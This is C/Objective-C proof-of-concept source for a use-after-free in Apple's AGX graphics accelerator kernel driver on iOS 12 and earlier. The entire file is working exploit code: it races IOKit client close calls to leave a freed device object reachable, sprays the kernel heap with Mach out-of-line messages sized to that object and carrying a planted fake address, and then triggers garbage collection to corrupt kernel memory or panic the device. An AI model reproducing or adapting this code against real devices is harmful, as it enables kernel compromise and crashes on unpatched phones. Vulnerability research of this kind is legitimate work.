#include <IOKit/IOKitLib.h>
#include <pthread.h>
#include <mach/mach.h>
//AGX UAF iOS 12 and before

extern int IOCloseConnection(io_connect_t conn);

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_descriptor_t desc[1];
} vm_spray_t;

uint64_t goodobjAddr=0xc4c4c4c4c4c4;

static bool spray(mach_port_t myport, int total_size)
{
    uint8_t buffer[4096] = {0};
    memset(buffer, 0xc3, 4096);
    *(uint64_t*)(buffer+216-0x18) = goodobjAddr;
    *(uint64_t*)(buffer+272-0x18) = 0;
    kern_return_t kr;
    uint8_t msg_buf[1024];
    vm_spray_t *msg;
    
    memset(msg_buf, 0, sizeof(msg_buf));
    msg = (vm_spray_t *)msg_buf;
    msg->header.msgh_remote_port = myport;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_size = sizeof(vm_spray_t) ;
    msg->body.msgh_descriptor_count = 1;
    msg->desc[0].out_of_line.address = buffer;
    msg->desc[0].out_of_line.size = total_size - 0x18;
    msg->desc[0].out_of_line.type = MACH_MSG_OOL_DESCRIPTOR;
    
    kr = mach_msg(&msg->header, MACH_SEND_MSG, msg->header.msgh_size, 0, 0, 0, 0);
    return (kr==0);
}

static int start =0;

static void triggerGC(void){
    int kr;
    io_service_t service;
    CFMutableDictionaryRef matching = IOServiceMatching("IOGraphicsAccelerator2");
    service = IOServiceGetMatchingService(0,
                                          matching);
    io_connect_t uc=0;
    
    kr = IOServiceOpen(service, task_self_trap(), 2, &uc);
    
    if(uc==0)
        return;
    while(start == 0){;}
    usleep(3);
    IOServiceClose(uc);
    IOObjectRelease(service);
}

void poc(void){
    
    //allocate ports for heap spray
    mach_port_t ports[128];
    for(int i =0;i<128;i++)
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    
    io_service_t    service;
    kern_return_t    kr;
    
    service = IOServiceGetMatchingService(0, IOServiceMatching("AGXAccelerator"));
    
    io_connect_t IOAccelDevice = 0;
    for(int i =0; i<2048;i++){
        IOAccelDevice = 0;
        kr = IOServiceOpen(service, task_self_trap(), 1, &IOAccelDevice);
        if(kr){
            NSLog(@"IOServiceOpen failed");
            return;
        }
        
        //try to trap into ::clientclose()
        IOCloseConnection(IOAccelDevice);
        
        char structoutput[1024]={0};
        size_t structoutputLen= 0x38;
        kr = IOConnectCallStructMethod(IOAccelDevice, 9, 0, 0, structoutput, &structoutputLen);
        if(kr==0){
            NSLog(@"we can still send message to this client, good!");
            break;
        }
        mach_port_destroy(mach_task_self(), (mach_port_t)IOAccelDevice);
    }
    
    char config[128]={0};
    size_t config_len= 0x40;
    kr = IOConnectCallStructMethod(IOAccelDevice, 1, 0, 0, config, &config_len);
    
    if(kr)
        NSLog(@"IOConnectCallStructMethod rets 0x%08x, %s", kr,config);
    
    //now we destroy it, but it was already inserted in a to-be-freed list
    mach_port_destroy(mach_task_self(), (mach_port_t)IOAccelDevice);

    //spray
    for(int i =0;i<128;i++){
        //agxdevice's size is 376
        spray(ports[i], 376);
    }
    sleep(1);
    for(int i =0; i< 256; i++){
        pthread_t runners[2];
        start = 0;
        pthread_create(&runners[0], 0, (void*)triggerGC, 0);
        pthread_create(&runners[1], 0, (void*)triggerGC, 0);
        start = 1;
        pthread_join(runners[0], 0);
        pthread_join(runners[1], 0);
    }
    printf("no panic? Run again\n");
}
